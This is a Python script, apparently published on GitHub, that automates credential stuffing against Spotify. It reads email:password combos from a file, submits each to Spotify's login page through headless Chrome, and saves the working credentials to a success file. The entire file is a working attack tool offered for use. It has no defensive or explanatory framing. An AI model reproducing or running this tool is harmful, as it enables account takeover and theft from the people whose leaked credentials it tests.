from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

import time
import os
import sys
import random




class SpotfiyChecker():
	def __init__(self):
		self.success = []
		self.invalid = []
		self.successC = 0
		self.invalidC = 0
		self.progress = 0
		self.CheckerStatus = 0
		self.retries = []
		user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36"
		chrome_options = webdriver.ChromeOptions()
		
		chrome_options.add_argument("--headless") # Runs Chrome in headless mode.
		chrome_options.add_argument('--no-sandbox') # Bypass OS security model
		chrome_options.add_argument('--disable-gpu')  # applicable to windows os only
		chrome_options.add_argument('start-maximized') 
		chrome_options.add_argument('disable-infobars')
		chrome_options.add_argument("--disable-extensions")
		chrome_options.add_argument(f'user-agent={user_agent}')
		chrome_options.add_argument('--ignore-certificate-errors')
		chrome_options.add_argument('--allow-running-insecure-content')
		chrome_options.add_argument('--log-level=OFF')
		self.driver = webdriver.Chrome(executable_path="chromedriver.exe",options=chrome_options)

		
	def login(self,email,password):
		self.driver.get("https://accounts.spotify.com/en/login/?continue=https:%2F%2Fopen.spotify.com%2F%3Fl2l%3D1")
		user = self.driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/form/div[1]/div/input').send_keys(email)
		pasw = self.driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/form/div[2]/div/input').send_keys(password)
		
		try:
			element_present = EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div[2]/div/form/div[4]/div[2]/button'))
			WebDriverWait(self.driver, 1).until(element_present)
			self.driver.find_element_by_xpath('/html/body/div[1]/div[2]/div/form/div[4]/div[2]/button').click()
			
		except:
			pass
		try:
			element_present = EC.presence_of_element_located((By.XPATH, '/html/body/div[1]/div[2]/div/div[2]/div/p/span'))
			WebDriverWait(self.driver, 3).until(element_present)
		except:
			pass
		if 'Incorrect username or password' in self.driver.page_source:
			self.logChecker(email,password,False)
		elif 'open.spotify.com' in self.driver.current_url:
			self.logChecker(email,password,True)
			self.driver.delete_all_cookies()
		else:
			self.retries.append([email,password])
	
		self.driver.delete_all_cookies()
	

	def logChecker(self,email,password,working):
		self.progress += 1
		if working:
			self.success.append([email,password])
			self.successC += 1
			self.appendToFile(email,password,working)
		else:
			self.invalid.append([email,password])
			self.invalidC += 1
			self.appendToFile(email,password,working)
		self.CheckerStatus = 1
		

	def createFile(self):
		open("sucess.txt","w").close()
		open("invalid.txt","w").close()

	def appendToFile(self,email,password,working):
		if self.CheckerStatus == 0:
			self.createFile()
		if working:
			with open("sucess.txt","a") as s:
				s.write("combo : "+email+":"+password+"\nEmail : "+email+"\nPassword : "+password+"\nType : Success\n"+"-"*10+'\n' )
		else:
			with open("invalid.txt","a") as s:
				s.write("combo : "+email+":"+password+"\nEmail : "+email+"\nPassword : "+password+"\nType : Invalid\n"+"-"*10+'\n' )

	def getRetries(self):
		return self.retries

	def retriesRemove(self,data):
		if data in self.retries:
			self.retries.remove(data)
	def printLog(self):
		os.system('cls')
		sys.stdout.write('''
 _____             _   _  __         _____ _               _             
/  ___|           | | (_)/ _|       /  __ \ |             | |            
\ `--. _ __   ___ | |_ _| |_ _   _  | /  \/ |__   ___  ___| | _____ _ __ 
 `--. \ '_ \ / _ \| __| |  _| | | | | |   | '_ \ / _ \/ __| |/ / _ \ '__|
/\__/ / |_) | (_) | |_| | | | |_| | | \__/\ | | |  __/ (__|   <  __/ |   
\____/| .__/ \___/ \__|_|_|  \__, |  \____/_| |_|\___|\___|_|\_\___|_|   
      | |                     __/ |                                      
      |_|                    |___/                                       
      		 - By Abhay (GITHUB:github.com/abhaygupta08)


   			RunningStatus : '''+str(self.CheckerStatus)+'''\n   		Progress : '''+str(self.progress)+'''\tValid : '''+str(self.successC)+'''\tInvalid : '''+str(self.invalidC)+'''\n''')
		sys.stdout.flush()
		print('\n\n')
		for e,p in self.success:
			print(e+':'+p)
		

app = SpotfiyChecker()
os.system('cls')
sys.stdout.write('''\r
		 _____             _   _  __         _____ _               _             
		/  ___|           | | (_)/ _|       /  __ \ |             | |            
		\ `--. _ __   ___ | |_ _| |_ _   _  | /  \/ |__   ___  ___| | _____ _ __ 
		 `--. \ '_ \ / _ \| __| |  _| | | | | |   | '_ \ / _ \/ __| |/ / _ \ '__|
		/\__/ / |_) | (_) | |_| | | | |_| | | \__/\ | | |  __/ (__|   <  __/ |   
		\____/| .__/ \___/ \__|_|_|  \__, |  \____/_| |_|\___|\___|_|\_\___|_|   
		      | |                     __/ |                                      
		      |_|                    |___/                                       
	      		 - By Abhay (GITHUB:github.com/abhaygupta08)


   			Starting Your Application...{}'''.format(random.choice(['\\','/'])) )
		

with open("combo.txt","r") as abhay:
	combo = abhay.readlines()

for combos in combo:
	combos = combos.strip()
	comb=combos.split(":")
	email = comb[0]
	password = comb[1]
	app.login(email,password) 
	app.printLog()   

retries = app.getRetries()
for email,password in retries:
 	if [email,password] in retries:
 		app.retriesRemove([email,password])
 	app.login(email,password)
